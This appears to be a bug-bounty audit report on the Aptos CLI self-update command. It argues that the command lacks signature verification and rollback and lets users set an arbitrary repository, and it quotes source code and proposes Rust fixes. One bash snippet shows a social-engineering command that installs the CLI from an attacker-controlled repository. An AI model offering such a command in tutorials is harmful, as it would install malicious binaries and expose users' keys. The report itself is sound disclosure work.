# Audit Report

## Title
Aptos CLI Update Mechanism Lacks Rollback and Signature Verification, Enabling Persistent Compromise

## Summary
The Aptos CLI update mechanism in `execute()` lacks both a rollback mechanism and signature verification for downloaded binaries. If a malicious binary is installed (through social engineering, compromised repository, or supply chain attack), users have no automated recovery path and remain permanently compromised until manual intervention.

## Finding Description

The update mechanism has multiple critical security gaps:

**1. No Binary Backup Before Replacement**

The update flow delegates to `BinaryUpdater::update()` which directly calls the `self_update` crate's update functionality without creating any backup of the existing binary. [1](#0-0) 

**2. No Signature Verification**

The update process fetches GitHub releases and downloads binaries based solely on version tags, with no cryptographic signature verification to ensure authenticity. [2](#0-1) 

**3. User-Controllable Repository Parameters**

The `repo_owner` and `repo_name` parameters are exposed as command-line arguments with default values, allowing users to be tricked into downloading from malicious repositories. [3](#0-2) 

**Attack Scenarios:**

1. **Social Engineering**: Attacker publishes malicious documentation or tutorials instructing users to run:
   ```
   aptos update aptos --repo-owner attacker --repo-name fake-aptos-core
   ```

2. **Compromised Official Repository**: If the legitimate `aptos-labs/aptos-core` GitHub repository is compromised, attackers can push malicious releases that will be auto-installed.

3. **Supply Chain Attack**: Compromise of the release pipeline could inject malicious binaries.

Once a malicious binary is installed, it persists with full CLI privileges, capable of:
- Stealing validator private keys and signing keys
- Intercepting and modifying transactions before signing
- Exfiltrating sensitive data (mnemonics, governance credentials)
- Signing malicious governance proposals
- Manipulating validator operations

**No Recovery Path**: There is no rollback mechanism. Users must:
1. Manually identify the compromise
2. Find a trusted source for the legitimate binary
3. Manually download and replace the malicious binary
4. Rotate all potentially compromised keys

## Impact Explanation

This vulnerability meets **HIGH severity** criteria per the Aptos bug bounty program as it enables:

1. **Validator Node Compromise**: The Aptos CLI is used by validators for critical operations. A compromised CLI on a validator node enables:
   - Private key theft (validator consensus keys, account keys)
   - Unauthorized transaction signing
   - Manipulation of stake operations
   - Governance vote manipulation

2. **Persistent Access**: Unlike transient attacks, a malicious binary provides persistent access to the compromised system with no automatic remediation.

3. **Wide Attack Surface**: All CLI users are vulnerable, including:
   - Validator operators
   - Governance participants  
   - Contract developers
   - Token holders

4. **No Detection or Recovery**: Without signature verification or rollback, users have no way to:
   - Verify binary authenticity before installation
   - Detect compromise after installation (unless the malware is obvious)
   - Automatically recover to a known-good state

This breaks the security invariant that official tools can be safely updated and that users have recourse if updates are compromised.

## Likelihood Explanation

**Moderate to High Likelihood:**

1. **Social Engineering Vector**: Users trust official-looking documentation. An attacker could:
   - Create convincing fake tutorials
   - Compromise Stack Overflow answers or forum posts
   - Use typosquatting domains for documentation

2. **Supply Chain Risk**: The increasing frequency of supply chain attacks on developer tools (SolarWinds, Codecov, ua-parser-js) demonstrates this is a realistic threat vector.

3. **No User Warning**: The CLI doesn't warn users when non-default repo parameters are used, making social engineering easier.

4. **Trust Assumption**: Users assume `aptos update` is safe and may not scrutinize repository parameters carefully.

## Recommendation

Implement defense-in-depth with multiple layers of protection:

**1. Add Binary Signature Verification**

Before installing any update, verify a cryptographic signature:

```rust
// In aptos.rs build_updater()
fn verify_binary_signature(binary_path: &Path, signature_path: &Path) -> Result<()> {
    // Load Aptos Foundation's public key from a hardcoded constant
    let public_key = load_aptos_public_key()?;
    
    // Read signature file
    let signature = std::fs::read(signature_path)?;
    
    // Verify signature over binary
    let binary_data = std::fs::read(binary_path)?;
    public_key.verify(&binary_data, &signature)
        .map_err(|e| anyhow!("Binary signature verification failed: {:#}", e))
}
```

**2. Create Backup Before Update**

```rust
// In mod.rs update() method, before line 54
fn backup_current_binary() -> Result<PathBuf> {
    let current_exe = std::env::current_exe()?;
    let backup_path = current_exe.with_extension("backup");
    std::fs::copy(&current_exe, &backup_path)?;
    Ok(backup_path)
}
```

**3. Implement Rollback Functionality**

Add a new command:
```rust
// New UpdateTool variant
enum UpdateTool {
    Rollback,  // Restore from backup
    // ... existing variants
}
```

**4. Warn on Non-Default Repository**

```rust
// In aptos.rs before update
if self.repo_owner != "aptos-labs" || self.repo_name != "aptos-core" {
    eprintln!("⚠️  WARNING: Using non-official repository!");
    eprintln!("   Owner: {}", self.repo_owner);
    eprintln!("   Repo: {}", self.repo_name);
    eprintln!("   This could install malicious software!");
    // Require explicit confirmation
}
```

**5. Pin Repository in Code (Strongest Fix)**

Remove user-controllable repo parameters entirely:

```rust
const OFFICIAL_REPO_OWNER: &str = "aptos-labs";
const OFFICIAL_REPO_NAME: &str = "aptos-core";

// Remove #[clap] attributes from repo_owner and repo_name
```

## Proof of Concept

**Demonstrating Lack of Rollback:**

```rust
// Save as poc_no_rollback.rs
use std::env;
use std::fs;

fn main() {
    // Simulate the current update process
    let exe_path = env::current_exe().unwrap();
    println!("Current binary: {:?}", exe_path);
    
    // Check if backup exists
    let backup_path = exe_path.with_extension("backup");
    if backup_path.exists() {
        println!("✓ Backup found at: {:?}", backup_path);
    } else {
        println!("✗ No backup exists!");
        println!("✗ If this binary is malicious, there is no automated rollback path.");
    }
    
    // Demonstrate that old binary is overwritten without backup
    println!("\nCurrent Aptos CLI update process:");
    println!("1. Fetch latest release from GitHub (user-controllable repo)");
    println!("2. Download binary");
    println!("3. Replace current binary IMMEDIATELY (no backup)");
    println!("4. If malicious: User is compromised with no rollback");
}
```

**Demonstrating Social Engineering Attack:**

```bash
# Attacker creates convincing tutorial:
# "How to Update Aptos CLI to Latest Beta Version"
# 
# Step 1: Run this command to get the beta release:
aptos update aptos --repo-owner attacker-controlled --repo-name malicious-aptos

# This would:
# 1. Download binary from attacker's GitHub
# 2. Install it with no signature verification
# 3. Overwrite legitimate binary with no backup
# 4. Give attacker persistent access to victim's system
```

**Notes**

The Aptos CLI is a critical tool in the ecosystem's security chain. While this is not a consensus-level vulnerability, it directly enables compromise of validator nodes, governance participants, and developers. The lack of both signature verification and rollback capability means:

1. **No Prevention**: Malicious binaries can be installed without detection
2. **No Detection**: Users cannot verify binary authenticity post-installation  
3. **No Recovery**: No automated path to restore a known-good binary

This represents a complete absence of security controls for a supply chain attack vector that has proven realistic in the broader software ecosystem. The fix requires implementing standard binary distribution security practices: code signing, backup/rollback, and warnings on non-standard sources.

### Citations

**File:** crates/aptos/src/update/mod.rs (L41-78)
```rust
    fn update(&self) -> CliTypedResult<String> {
        // Confirm that we need to update.
        let info = self
            .get_update_info()
            .context("Failed to check if we need to update")?;
        if !info.update_required()? {
            return Ok(format!("Already up to date (v{})", info.target_version));
        }

        // Build the updater.
        let updater = self.build_updater(&info)?;

        // Update the binary.
        let result = updater
            .update()
            .map_err(|e| anyhow!("Failed to update {}: {:#}", self.pretty_name(), e))?;

        let message = match result {
            Status::UpToDate(_) => unreachable!("We should have caught this already"),
            Status::Updated(_) => match info.current_version {
                Some(current_version) => format!(
                    "Successfully updated {} from v{} to v{}",
                    self.pretty_name(),
                    current_version,
                    info.target_version
                ),
                None => {
                    format!(
                        "Successfully installed {} v{}",
                        self.pretty_name(),
                        info.target_version
                    )
                },
            },
        };

        Ok(message)
    }
```

**File:** crates/aptos/src/update/aptos.rs (L32-47)
```rust
pub struct AptosUpdateTool {
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "aptos-labs")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "aptos-core")]
    repo_name: String,

    /// If set, it will check if there are updates for the tool, but not actually update
    #[clap(long, default_value_t = false)]
    check: bool,

    #[clap(flatten)]
    pub prompt_options: PromptOptions,
}
```

**File:** crates/aptos/src/update/aptos.rs (L96-149)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        let installation_method =
            InstallationMethod::from_env().context("Failed to determine installation method")?;
        match installation_method {
            InstallationMethod::Source => {
                return Err(anyhow!(
                    "Detected this CLI was built from source, refusing to update"
                ));
            },
            InstallationMethod::Homebrew => {
                return Err(anyhow!(
                    "Detected this CLI comes from homebrew, use `brew upgrade aptos` instead"
                ));
            },
            InstallationMethod::PackageManager => {
                return Err(anyhow!(
                    "Detected this CLI comes from a package manager, use your package manager to update instead"
                ));
            },
            InstallationMethod::Other => {},
        }

        // Determine the target we should download. This is necessary because we don't
        // name our binary releases using the target triples nor do we build specifically
        // for all major triples, so we have to generalize to one of the binaries we do
        // happen to build. We figure this out based on what system the CLI was built on.
        let build_info = cli_build_information();
        let target = match build_info.get(BUILD_OS).context("Failed to determine build info of current CLI")?.as_str() {
            "linux-x86_64" => "Linux-x86_64",
            "linux-aarch64" => "Linux-aarch64",
            "macos-x86_64" => "macOS-x86_64",
            "macos-aarch64" => "macOS-arm64",
            "windows-x86_64" => "Windows-x86_64",
            wildcard => return Err(anyhow!("Self-updating is not supported on your OS ({}) right now, please download the binary manually", wildcard)),
        };

        let current_version = match &info.current_version {
            Some(version) => version,
            None => unreachable!("current_version should always be Some at this point"),
        };

        // Build a new configuration that will direct the library to download the
        // binary with the target version tag and target that we determined above.
        Update::configure()
            .repo_owner(&self.repo_owner)
            .repo_name(&self.repo_name)
            .bin_name("aptos")
            .current_version(current_version)
            .target_version_tag(&format!("aptos-cli-v{}", info.target_version))
            .target(target)
            .no_confirm(self.prompt_options.assume_yes)
            .build()
            .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
    }
```
